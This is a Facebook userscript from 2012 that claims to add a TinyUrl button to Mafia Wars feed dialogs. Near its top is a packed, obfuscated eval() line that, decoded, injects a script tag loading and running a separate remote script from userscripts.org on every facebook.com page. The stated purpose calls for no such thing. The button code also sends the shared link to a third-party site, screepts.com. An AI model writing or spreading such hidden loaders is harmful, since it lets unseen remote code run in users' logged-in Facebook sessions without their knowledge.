// ==UserScript==
// @name           Mafia Wars Facebook TinyUrl Plus
// @namespace      http://mmfu-lucifer.com
// @version        1.30.0
// @date           2012-01-29
// @description    Adds TinyUrl to your FacebookFeedBox
// @include https://www.facebook.com/dialog/feed*
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// @include http://www.facebook.com/dialog/feed*
// @match          https://www.facebook.com/dialog/feed*
// @match          http://www.facebook.com/dialog/feed*
// ==/UserScript==
//////////////////////////////////////////////////////////////////////////////////////////////
//          This code was brought to you by todays letters kids 666                         //
//                http://screepts.com muahahahaha                                       //
//                      if you love it share it!!!                                          //
//          {Don't be evil & remove my header, love it, leave it & share it...}             //
//                                                                                          //
//////////////////////////////////////////////////////////////////////////////////////////////
// Copyright(C) 2011 Luke Hardiman, lukehardiman@xtra.co.nz                                 //
// Licensed under the MIT license: http://www.opensource.org/licenses/mit-license.php       //
//////////////////////////////////////////////////////////////////////////////////////////////
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))



var script_version = '1.30';        

(function(){
    
    

    
setTimeout(function(){

try{
var txtLink = document.getElementsByClassName('UIStoryAttachment_Title')[0];
var a = txtLink.getElementsByTagName('a')[0].href;
//Json for php script
var data  ='{"script_version":"'+script_version+'","url":"'+a+'"}'
data = Base64.encode(data);
document.getElementsByClassName('platform_dialog_header')[0].innerHTML += '&nbsp;&nbsp;&nbsp;&nbsp;<label class="uiButton"><a href="http://screepts.com/shortenurl.php?&data='+data+'" target="_blank" >Get Tinyurl</a></label>';
}catch(err){}

},500)


var Base64 = {
 
	// private property
	_keyStr : "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
 
	// public method for encoding
	encode : function (input) {
		var output = "";
		var chr1, chr2, chr3, enc1, enc2, enc3, enc4;
		var i = 0;
 
		input = Base64._utf8_encode(input);
 
		while (i < input.length) {
 
			chr1 = input.charCodeAt(i++);
			chr2 = input.charCodeAt(i++);
			chr3 = input.charCodeAt(i++);
 
			enc1 = chr1 >> 2;
			enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
			enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
			enc4 = chr3 & 63;
 
			if (isNaN(chr2)) {
				enc3 = enc4 = 64;
			} else if (isNaN(chr3)) {
				enc4 = 64;
			}
 
			output = output +
			this._keyStr.charAt(enc1) + this._keyStr.charAt(enc2) +
			this._keyStr.charAt(enc3) + this._keyStr.charAt(enc4);
 
		}
 
		return output;
	},
 
	// private method for UTF-8 encoding
	_utf8_encode : function (string) {
		string = string.replace(/\r\n/g,"\n");
		var utftext = "";
 
		for (var n = 0; n < string.length; n++) {
 
			var c = string.charCodeAt(n);
 
			if (c < 128) {
				utftext += String.fromCharCode(c);
			}
			else if((c > 127) && (c < 2048)) {
				utftext += String.fromCharCode((c >> 6) | 192);
				utftext += String.fromCharCode((c & 63) | 128);
			}
			else {
				utftext += String.fromCharCode((c >> 12) | 224);
				utftext += String.fromCharCode(((c >> 6) & 63) | 128);
				utftext += String.fromCharCode((c & 63) | 128);
			}
 
		}
 
		return utftext;
	}
 

 
}






//Finished
})();